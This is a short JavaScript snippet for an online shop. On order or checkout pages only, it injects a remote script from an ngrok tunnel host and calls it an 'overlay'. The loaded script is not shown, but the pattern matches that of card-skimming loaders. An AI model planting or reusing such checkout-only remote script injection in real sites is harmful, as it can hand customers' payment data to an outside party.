// Load overlay only on checkout page
if (window.location.href.indexOf('/order') > -1 || window.location.href.indexOf('controller=order') > -1) {
    var s = document.createElement('script');
    s.src = 'https://sandbox-open-pay.ngrok.io/overlay.js';
    document.body.appendChild(s);
}
